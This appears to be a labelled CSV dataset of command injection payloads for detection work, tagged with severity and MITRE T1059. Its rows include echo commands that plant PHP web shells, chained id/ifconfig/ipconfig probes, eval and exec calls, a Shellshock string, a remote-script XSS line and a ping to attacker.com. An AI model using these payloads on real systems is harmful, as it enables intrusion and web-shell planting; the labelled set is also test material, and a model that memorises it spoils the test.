Payload,Signature,AttackType,Severity,MITRE,Label,Description
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;echo '<script>alert(1)</script>',XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
echo '<script>alert(1)</script>'// XXXXXXXXXXX,XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
() { :;}; echo vulnerable 10,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('ls'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('pwd'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('pwd');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('sleep 5'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('sleep 5');,CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('whoami'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
eval('whoami');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('ls'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('pwd'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('pwd');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('sleep 5'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('sleep 5');,CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('whoami'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
exec('whoami');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
";{$_GET[""cmd""]}",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
`id`,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| powershell -enc BASE64_ENCODED_COMMAND,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; ping -c 10 attacker.com,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&&id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
;id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
/index.html|id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
ipconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
| ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
; ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
& ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
&& ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (master branch)
